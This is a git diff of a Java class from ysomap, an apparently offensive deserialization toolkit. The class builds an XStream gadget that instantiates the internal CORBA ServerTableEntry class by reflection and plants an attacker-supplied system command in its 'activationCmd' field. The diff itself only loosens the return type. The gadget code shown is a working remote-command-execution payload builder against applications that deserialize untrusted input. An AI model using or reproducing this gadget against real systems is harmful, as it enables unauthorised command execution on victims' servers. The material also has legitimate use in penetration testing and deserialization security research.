@@ -1,6 +1,5 @@
 package ysomap.bullets.jdk;
 
-import com.sun.corba.se.impl.activation.ServerTableEntry;
 import com.sun.corba.se.impl.logging.ActivationSystemException;
 import com.sun.corba.se.spi.activation.RepositoryPackage.ServerDef;
 import ysomap.bullets.Bullet;
@@ -17,19 +16,19 @@ import ysomap.core.util.ReflectionHelper;
 @Details("执行任意系统命令")
 @Targets({Targets.XSTREAM})
 @Authors({Authors.WH1T3P1G})
-public class ServerTableEntryBullet implements Bullet<ServerTableEntry> {
+public class ServerTableEntryBullet implements Bullet<Object> {
 
     @NotNull
     @Require(name = "command", detail = DetailHelper.COMMAND)
     public String command;
 
     @Override
-    public ServerTableEntry getObject() throws Exception {
+    public Object getObject() throws Exception {
         Object entry = ReflectionHelper.newInstance(
                 "com.sun.corba.se.impl.activation.ServerTableEntry",
                 new Class[]{ActivationSystemException.class, int.class, ServerDef.class, int.class, String.class, boolean.class, boolean.class},
                 new Object[]{null,1,new ServerDef("","","","",""),1,"",true,false});
         ReflectionHelper.setFieldValue(entry, "activationCmd", command);
-        return (ServerTableEntry) entry;
+        return entry;
     }
 }
